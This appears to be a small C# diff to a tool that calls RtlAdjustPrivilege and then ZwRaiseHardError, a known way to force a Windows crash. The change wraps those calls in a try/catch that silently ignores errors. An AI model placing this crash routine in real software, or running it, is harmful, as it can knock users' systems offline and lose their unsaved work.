@@ -20,9 +20,13 @@ namespace ZwRaiseHardError {
         }
 
         public static void ZwRaiseHardError() {
-            _ = RtlAdjustPrivilege(Privilege, true, false, out _);
+            try {
+                _ = RtlAdjustPrivilege(Privilege, true, false, out _);
 
-            ZwRaiseHardError(ErrorStatus, 0, 0, IntPtr.Zero, ValidResponseOption, out _);
+                ZwRaiseHardError(ErrorStatus, 0, 0, IntPtr.Zero, ValidResponseOption, out _);
+            } catch (Exception) {
+                // ignored
+            }
         }
     }
 }
